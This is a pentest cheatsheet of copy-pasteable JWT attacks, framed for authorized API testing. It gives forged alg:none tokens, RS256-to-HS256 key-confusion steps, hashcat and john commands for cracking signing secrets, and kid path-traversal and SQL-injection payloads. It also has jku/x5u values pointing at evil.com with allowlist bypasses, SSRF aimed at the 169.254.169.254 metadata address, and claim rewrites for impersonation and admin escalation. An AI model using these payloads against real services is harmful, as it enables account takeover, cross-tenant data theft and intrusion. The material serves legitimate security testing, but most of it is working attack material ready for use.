# JWT Attack Cheatsheet

Copy-pasteable JWT attacks for **authorized** API testing. A JWT is
`base64url(header) . base64url(payload) . signature`. Decode first, then attack the weakest link:
the signature-verification logic. Validate every finding against the Trinet Validation Ladder — a
tampered token is only a bug if the server **accepts** it and it yields impact.

Decode quickly:
```bash
echo '<jwt>' | cut -d. -f1 | base64 -d 2>/dev/null; echo
echo '<jwt>' | cut -d. -f2 | base64 -d 2>/dev/null; echo
# or:  jwt_tool <jwt>
```

---

## 1. alg = none (unsigned token accepted)

Server honors the header `alg`; if it accepts `none`, drop the signature entirely.
```
Header:  {"alg":"none","typ":"JWT"}
Payload: {"sub":"admin","role":"admin"}
Token:   base64url(header) + "." + base64url(payload) + "."      ← trailing dot, empty signature
```
Try case/spacing variants that dodge naive blocklists: `None`, `NONE`, `nOnE`.
```bash
jwt_tool <jwt> -X a                 # alg:none attack (all case variants)
```

---

## 2. RS256 → HS256 key confusion (sign with the public key)

If verification picks the algorithm from the header and the server holds only the RSA **public** key,
switch `alg` to `HS256` and HMAC-sign using that public key (its exact PEM bytes) as the shared secret.
The server "verifies" RS256-as-HS256 with the public key and it matches.

```
1. Obtain the RSA public key:
   - /jwks.json, /.well-known/jwks.json, /.well-known/openid-configuration
   - the TLS certificate, or derive n/e from two captured tokens (rsa_sign2n).
2. Convert JWK → PEM if needed.
3. Set header alg = HS256; edit payload (e.g. "role":"admin").
4. HMAC-SHA256 "header.payload" with the PUBLIC KEY PEM as the secret; append as the signature.
```
```bash
jwt_tool <jwt> -X k -pk public.pem              # automated key-confusion
# derive public key from two tokens if you lack the JWKS:
python3 rsa_sign2n.py <jwt1> <jwt2>             # produces candidate public keys → try each
```

---

## 3. Weak-secret crack (HS256/384/512)

If HMAC-signed with a guessable secret, crack offline then forge freely.
```bash
hashcat -m 16500 jwt.txt /path/to/rockyou.txt
hashcat -m 16500 jwt.txt -a 3 ?a?a?a?a?a?a?a?a          # brute mask
john --format=HMAC-SHA256 jwt.txt --wordlist=rockyou.txt
```
`jwt.txt` = the full token on one line. After cracking, re-sign:
```bash
jwt_tool <jwt> -S hs256 -p "<cracked-secret>" -pc role -pv admin
```

---

## 4. kid header injection (path traversal / SQLi)

`kid` selects the verification key. If used unsafely to build a file path or SQL query, control the key.

Path traversal → point `kid` at a file whose bytes you know, then HMAC-sign with those bytes:
```
"kid":"../../../../../../dev/null"     → key = empty → sign HS256 with empty string ""
"kid":"/dev/null"
"kid":"../../../public/css/style.css"  → key = that file's bytes (fetch them, use as HMAC secret)
```
```bash
jwt_tool <jwt> -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""
```
SQL injection in `kid` (server looks the key up in a DB — return an attacker-known value):
```
"kid":"nonexistent' UNION SELECT 'attacker-known-secret'-- -"
```
Then sign HS256 with `attacker-known-secret`.

---

## 5. jku / x5u SSRF (attacker-hosted key set)

`jku`/`x5u` tell the server where to fetch the verification key. Point them at your host (serve a JWKS
whose private key you hold) or at an internal host (blind SSRF).
```
"jku":"https://evil.com/jwks.json"
"x5u":"https://evil.com/cert.pem"
```
Bypass a same-host / allowlist check by chaining an open redirect or SSRF on the target:
```
"jku":"https://TARGET/redirect?url=https://evil.com/jwks.json"
"jku":"https://TARGET@evil.com/jwks.json"
"jku":"https://evil.com/jwks.json#.TARGET.com"
```
Workflow: generate an RSA keypair, host the public key as a JWKS at your `jku`, set the token's `kid`
to match, sign with your private key. Also usable as **blind SSRF**: point `jku` at `http://COLLAB/`
or `169.254.169.254` and watch for the callback / internal fetch.

---

## 6. Expired / nbf handling

Check whether time claims are actually enforced.
```
- Replay an EXPIRED token (past "exp"): still accepted → exp not validated.
- Set "nbf" (not-before) far in the future: accepted → nbf not validated.
- Remove "exp" / "nbf" entirely: accepted → no expiry enforced (token never dies).
- Extend "exp" far into the future (requires a valid signature — combine with §1–§4).
```
```bash
jwt_tool <jwt> -T           # tamper mode: interactively edit exp/nbf/claims and re-send
```

---

## 7. Claim tampering (BOLA / privesc via sub / role)

Once you can forge a valid signature (alg:none, key confusion, cracked secret, kid/jku), rewrite claims.
BOLA / horizontal takeover:
```
"sub":"<victim-user-id>"        → act as another user
"user_id":"<other>", "uid":"<other>", "email":"victim@target.com"
"tenant":"<other-tenant>", "org":"<other-org>"   → cross-tenant access
```
Privilege escalation (vertical):
```
"role":"admin"   "roles":["admin"]   "isAdmin":true   "scope":"admin"
"admin":true     "permissions":["*"]   "group":"administrators"
```
Prove BOLA with a real second identity: forging `sub` to a victim's id and reading their data is the
finding — reference **CWE-639 (IDOR/BOLA)** and **CWE-347 (improper signature verification)**.

---

## Tooling summary

```bash
jwt_tool <jwt> -M at                # all-tests scan (alg:none, key confusion, injection, claims)
jwt_tool <jwt> -X a|k|i|s           # specific attacks
python3 rsa_sign2n.py <jwt1> <jwt2> # recover RSA public key from two tokens
hashcat -m 16500 jwt.txt wordlist   # crack HS256 secret
```
- Burp **JWT Editor** extension — edit header/claims, auto key-confusion, embed JWK, sign in Repeater.
- Always confirm the **server accepts** the forged token (200 + privileged data), not just that you
  crafted it. Report with the request/response pair, both identities for BOLA, tokens redacted.

References: **CWE-347** (signature not verified), **CWE-345** (insufficient authenticity), **CWE-287**
(improper auth), **CWE-639** (BOLA via claim tampering). OWASP **API2:2023** (broken authentication).
Cross-reference GraphQL auth testing in [graphql.md](graphql.md).
